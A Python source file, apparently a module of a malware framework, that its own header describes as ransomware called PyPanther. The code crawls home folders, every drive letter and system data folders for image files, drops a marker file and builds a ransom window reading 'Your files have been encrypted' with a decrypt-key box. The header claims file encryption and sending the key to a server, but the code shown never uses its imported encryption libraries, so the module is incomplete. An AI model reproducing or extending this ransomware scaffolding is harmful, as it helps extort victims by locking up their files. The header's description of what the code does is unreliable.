#!name##PyPanther
#!itemType##module
#!fileType##PY_MOD
#!info##A Python-based ransomware module. It searches for selected files, starts encrypting them, displays a notification window, and creates a file on the desktop. It generates an encryption key, strengthens it with an additional password, and sends it to the server. Supports two operation modes: Silent mode, which encrypts files one by one with timed intervals. Fast mode, which encrypts multiple files in parallel for maximum speed.
#!hiveType##PyExM
#!lang##python
#!pyType##module


import os
import base64
import tkinter
import threading
import string
import secrets
import pathlib
import random
import platform
from typing import Union
from time import sleep


import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt



class PyPanther:
    MTYPES = "rat"
    def __init__(self, worm: object):
        self.worm = worm
        self.fpath_lock = threading.Lock()
        self._TARGET_FILES = set()
        self.TARGET_FILE_EXT = [".jpg", ".gif", ".jpeg", ".webp", ".bmp"]
        self.TARGET_FILE_NAME = ["*"]
        self.BANNED_DIR = ["Windows", "windows", "temp", "Temp", "TEMP", "tmp", "TMP", "Program Files"]
        self.CHECK_FILE_NAME = "AlaMaKota.txt"
        self.CHECK_FILE_PATH = self.buildCheckWorkPath()
        self.START_PATH = self.startPath()
        self.SCAN_THREAD = None

        self.FLAG_decryption_working = False
        if self.TARGET_FILE_NAME[0] == "*":
            self.FLAG_ignore_file_name = True
        else:
            self.FLAG_ignore_file_name = False
    
    @property
    def TARGET_FILES(self) -> list:
        with self.fpath_lock:
            return list(self._TARGET_FILES)
        
    
    ######## CHECK FILE #######
    
    def buildCheckWorkPath(self) -> str:
        if platform.system().lower() == "linux":
            return os.path.join(pathlib.Path.home(), f".{self.CHECK_FILE_NAME}")
        else:
            return os.path.join(pathlib.Path.home(), self.CHECK_FILE_NAME)
    
    def makeCheckWorkFile(self) -> bool:
        try:
            with open(self.CHECK_FILE_PATH, "wb") as file:
                file.write(b"")
            return True
        except:
            return False
    
    def checkWorkFile(self) -> bool:
        if os.path.exists(self.CHECK_FILE_PATH):
            return True
        else:
            return False
    #####################################################################

    ##### Screen ########

    def _checkDecKey(self, tk_wtxt: object, elabel: object) -> None:
        if self.FLAG_decryption_working:
            elabel.config(text="Decryption still working....")
            return
        dkey = tk_wtxt.get('1.0', 'end-1c')
        if len(dkey.strip(" ")) == 0:
            elabel.config(text="Wrong KEY !!!!!")
        else:
            self.FLAG_decryption_working = True
            elabel.config(text="Start decryption process.....")
            


    def _buildWarnWindow(self) -> None:
        window = tkinter.Tk()
        window.geometry("800x500")
        window.title("PANTHER")
        window.configure(bg="red")
        mlabel = tkinter.Label(window, text="!!! Your files have been encrypted !!!", font=("Arial", 26), fg="black", bg="red")
        mlabel.pack(pady=25)
        tlabel = tkinter.Label(window, text="ALA MA KOTA", font=("Arial", 16))
        tlabel.pack(pady=30)
        elabel = tkinter.Label(window, text="", bg="red", font=("Arial", 14), fg="black")
        elabel.pack(pady=60)
        dlabel = tkinter.Label(window, text="Decrypt Key", font=("Arial", 16))
        dlabel.pack(pady=10)
        wtxt = tkinter.Text(window, height=1, width=64, bg="white", fg="black")
        wtxt.pack(pady=5)
        dbutt = tkinter.Button(window, text="DECRYPT", command=lambda: self._checkDecKey(wtxt, elabel))
        dbutt.pack()
        window.mainloop()

    def buildWarnWindow(self) -> None:
        ww = threading.Thread(target=self._buildWarnWindow)
        ww.start()

    #####################################################################

    ###### find files ###########

    def addTargetFile(self, fpath: str) -> None:
        with self.fpath_lock:
            self._TARGET_FILES.add(fpath)

    def startPath(self) -> list:
        stpath = []
        stpath.append(pathlib.Path.home())
        if platform.system().lower() == "linux":
            stpath.extend(["/media", "/mnt", "/var"])
        else:
            stpath.extend([os.environ.get("APPDATA"), os.environ.get("LOCALAPPDATA"), os.environ.get("PUBLIC"), os.environ.get("PROGRAMDATA"), os.environ.get("ONEDRIVE")])
            for c in string.ascii_lowercase:
                if os.path.exists(f"{c}:/"):
                    stpath.append(f"{c}:/")
        return stpath
    
    def checkFileName(self, raw_name: str) -> bool:
        for bn in self.TARGET_FILE_NAME:
            if bn in raw_name:
                return True
        return False
    
    def checkFile(self, fpath: str) -> bool:
        fname = os.path.basename(fpath)
        rname, fext = os.path.splitext(fname)
        if self.FLAG_ignore_file_name:
            if fext in self.TARGET_FILE_EXT:
                return True
            else:
                return False
        else:
            if self.checkFileName(rname):
                if fext in self.TARGET_FILE_EXT:
                    return True
        return False
    
    def checkDirectory(self, dir_path: str) -> None:
        for root, dirs, files in os.walk(dir_path):
            for f in files:
                fpath = os.path.join(root, f)
                if self.checkFile(fpath):
                    self.addTargetFile(fpath)
        
    def checkStartDirectory(self, dir_path: str):
        for cf in os.listdir(dir_path):
            cpath = os.path.join(dir_path, cf)
            if os.path.isdir(cpath):
                th = threading.Thread(target=self.checkDirectory, args=(cpath, ))
                th.start()
            else:
                if self.checkFile(cpath):
                    self.addTargetFile(cpath)
    
    def _findTargetFiles(self) -> None:
        ths = []
        for spath in self.START_PATH:
            th = threading.Thread(target=self.checkStartDirectory, args=(spath, ))
            th.start()
            ths.append(th)
        for t in ths:
            t.join()
        print("SCAN DONE")
        sleep(2)
        for fp in self.TARGET_FILES:
            print(fp)
    
    def findTargetFiles(self) -> None:
        if self.SCAN_THREAD:
            if self.SCAN_THREAD.is_alive():
                print("Scaning is still processing")
                return
        self.SCAN_THREAD = threading.Thread(target=self._findTargetFiles)
        self.SCAN_THREAD.start()

    


    def evilWork(self) -> None:
        if self.checkWorkFile():
            print("[PyPanther] Finding CHECK_FILE")
        else:
            if self.makeCheckWorkFile():
                print("[PyPanther] CHECK_FILE created")
            else:
                print("[PyPanther] Error making CHECK_FILE")
    


    def start(self) -> None:
        print("[PyPanther] Starting....")
        print("[PyPanther] Check File Path: ", self.CHECK_FILE_PATH)
        print(self.START_PATH)
        self.findTargetFiles()
        